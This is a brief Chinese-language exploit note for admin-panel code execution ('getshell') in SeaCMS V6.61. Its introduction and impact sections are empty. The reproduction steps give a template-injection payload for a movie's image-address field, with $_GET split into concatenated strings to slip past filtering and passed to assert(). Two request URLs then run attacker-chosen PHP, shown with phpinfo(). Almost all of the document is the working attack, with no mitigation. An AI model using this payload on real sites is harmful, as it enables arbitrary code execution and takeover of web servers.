Seacms V6.61 后台getshell
=========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

首先登录到管理面板，在这种情况下，将admin目录调整为`/backend`

其次添加电影并将其图片地址设置为` {if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if}`

添加访问后，`/details/index.php?1.html&m=admin&a=assert&b=phpinfo();`

这里的1.html是您刚刚添加的视频的ID。

或者，可以访问`/search.php?searchtype=5&tid=0&a=assert&b=phpinfo();`显示您刚添加的视频图片的任何其他地方。
